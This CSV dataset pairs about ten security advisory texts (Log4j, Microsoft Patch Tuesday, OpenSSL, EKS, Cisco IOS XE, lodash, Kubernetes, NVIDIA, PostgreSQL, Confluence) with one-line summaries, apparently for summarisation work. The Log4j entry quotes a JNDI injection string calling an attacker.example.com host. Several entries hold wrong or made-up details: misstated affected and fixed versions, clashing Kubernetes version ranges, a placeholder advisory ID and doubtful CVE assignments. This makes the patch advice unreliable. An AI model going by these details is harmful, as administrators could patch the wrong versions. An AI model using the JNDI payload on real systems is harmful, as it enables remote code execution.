advisory,summary
"Apache published security advisory for Log4j versions 2.0-beta9 through 2.17.0, tracked as CVE-2021-44228 (severity: critical, CVSS 10.0). A remote attacker who controls log message inputs can execute arbitrary code by injecting a JNDI lookup string such as ${jndi:ldap://attacker.example.com/a}. The vulnerability affects all Java applications that use Log4j for logging and call .info(), .error(), etc. on attacker-controllable input. Apache recommends upgrading to 2.17.1 or later, or as an interim workaround setting the system property log4j2.formatMsgNoLookups=true. Active exploitation observed in the wild since December 9, 2021. CISA added this CVE to the Known Exploited Vulnerabilities catalog.","Critical RCE in Log4j ≤2.17.0 (CVE-2021-44228, CVSS 10.0). Patch to 2.17.1+ or set log4j2.formatMsgNoLookups=true. Actively exploited."
"Microsoft Patch Tuesday April 2024 covers 149 vulnerabilities across Windows, Office, Azure, and Edge. Three vulnerabilities are rated Critical and have been observed in active exploitation: CVE-2024-26234 (Proxy Driver Spoofing, exploited by malware), CVE-2024-29988 (SmartScreen Prompt bypass, used in initial-access campaigns), and CVE-2024-29991 (Edge Chromium-based memory safety). Microsoft has released patches via the standard Windows Update channel. Server administrators are advised to test patches in staging and roll out within 14 days per company patch SLA.","Microsoft April 2024 Patch Tuesday: 149 CVEs, 3 critical exploited in the wild. Patch within 14 days; prioritize servers running Edge or SmartScreen."
"OpenSSL announced the release of OpenSSL 3.0.13 and 1.1.1w to address CVE-2024-0727, a denial-of-service vulnerability in the PKCS12 parser. An attacker who can supply a crafted PKCS12 file to an OpenSSL-based application can trigger a NULL pointer dereference, crashing the process. The vulnerability is rated Moderate severity (no RCE). Applications that parse untrusted PKCS12 input (such as certificate-handling tools, VPN clients, or email signing utilities) should upgrade. Library consumers must rebuild against the patched version.","Moderate DoS in OpenSSL PKCS12 parser (CVE-2024-0727). Upgrade to 3.0.13 / 1.1.1w if you parse untrusted certs."
"AWS announced an Amazon EKS security advisory regarding container runtime configurations. EKS clusters configured with the default audit logging policy were inadvertently logging Kubernetes secrets in cleartext to CloudWatch when secret resources were created or updated via the API. Affected versions: EKS 1.27 through 1.29 prior to the 2024-03-15 patch. Recommended action: rotate any secrets created or updated since cluster provisioning, enable secret-resource exclusion in the audit policy, and review CloudWatch logs for exposure. AWS has applied the fix to the managed control plane; no customer action is required for the patch itself but secret rotation is mandatory.","AWS EKS 1.27–1.29 logged Kubernetes secrets in cleartext to CloudWatch. Rotate all secrets created/updated since cluster setup; AWS already patched the control plane."
"Cisco Talos published an advisory for a stack-based buffer overflow in the Cisco IOS XE software's HTTP daemon (CVE-2024-20355, CVSS 9.8). The vulnerability allows an unauthenticated remote attacker to execute arbitrary code as root by sending a specially crafted HTTP request. The HTTP daemon is enabled by default on most Cisco IOS XE devices. Affected devices include Catalyst 9000 series, ISR 4000 series, and ASR 1000 series running IOS XE 17.6.x through 17.12.x. Workaround: disable the HTTP daemon via 'no ip http server' if not required. Fixed in IOS XE 17.12.4 and 17.13.1.","Critical RCE in Cisco IOS XE HTTP daemon (CVE-2024-20355, CVSS 9.8). Patch to 17.12.4+ or disable HTTP daemon. Affects Catalyst 9000, ISR 4000, ASR 1000."
"GitHub Security Advisory GHSA-XXXX disclosed a prototype pollution vulnerability in the lodash.merge function (versions before 4.17.21). Applications that pass attacker-controlled JSON to lodash.merge can have arbitrary properties set on Object.prototype, leading to potential property override attacks. Severity: Medium. Upgrade lodash to 4.17.21 or replace lodash.merge with structuredClone() or a safer merge implementation. Most modern frontends already depend on a patched version via transitive dependencies.","Medium prototype-pollution in lodash.merge <4.17.21. Upgrade lodash or swap for structuredClone in JSON-merge code paths."
"Kubernetes published a security advisory for CVE-2024-9594, an authorization bypass in the kube-apiserver when handling certain SubjectAccessReview requests with malformed Group claims. An attacker with valid credentials but lower privileges could craft a request that the API server evaluates with elevated permissions due to a serialization edge case. Affects Kubernetes 1.27.0 through 1.29.3, 1.28.0 through 1.28.8, and earlier 1.29 releases. Severity: High. Fixed in 1.27.13, 1.28.9, 1.29.4. Operators should review audit logs for unauthorized SubjectAccessReview calls in the last 30 days.","High auth bypass in kube-apiserver SubjectAccessReview (CVE-2024-9594). Upgrade to 1.27.13 / 1.28.9 / 1.29.4 and audit-log past 30 days for abuse."
"NVIDIA published a security bulletin for the NVIDIA Container Toolkit (formerly nvidia-docker). CVE-2024-0132 (severity: Critical, CVSS 9.0) allows a malicious container image to escape the container and gain root on the host via a TOCTOU race in the OCI runtime hook. Affects nvidia-container-toolkit versions 1.16.1 and earlier. The vulnerability is exploitable on any host running GPU-enabled containers. Fixed in 1.16.2. Mitigation: do not run untrusted container images on GPU hosts until upgraded.","Critical container-escape in NVIDIA Container Toolkit ≤1.16.1 (CVE-2024-0132, CVSS 9.0). Upgrade to 1.16.2; don't run untrusted images on GPU hosts in the meantime."
"PostgreSQL released security updates for all supported versions (16.4, 15.8, 14.13, 13.16, 12.20) addressing CVE-2024-7348, a time-of-check / time-of-use race in pg_dump that allows an attacker with database connection privileges to execute arbitrary SQL as the role running pg_dump (often the superuser performing backups). Exploitation requires the ability to create tables in the dumped schema. Severity: Important. Recommended action: upgrade to the patched minor version. Workaround: do not run pg_dump as superuser against schemas that untrusted users can create objects in.","Important TOCTOU race in pg_dump (CVE-2024-7348) lets users escalate to backup-role privileges. Patch to 16.4 / 15.8 / 14.13 / 13.16 / 12.20."
"Atlassian Confluence Data Center and Server announced CVE-2024-21683, a remote code execution vulnerability in the macro template parsing engine. An authenticated user with permission to add new macro templates can execute arbitrary code on the Confluence server. Severity: High (CVSS 8.3). Affects Data Center and Server versions 5.2 through 8.9.x. Atlassian recommends upgrading to 8.9.1 or later. Confluence Cloud is not affected. Self-hosted operators should audit recent macro template additions for malicious payloads.","High RCE in Confluence Data Center/Server macro templates (CVE-2024-21683). Authenticated. Upgrade to 8.9.1+. Cloud is not affected."
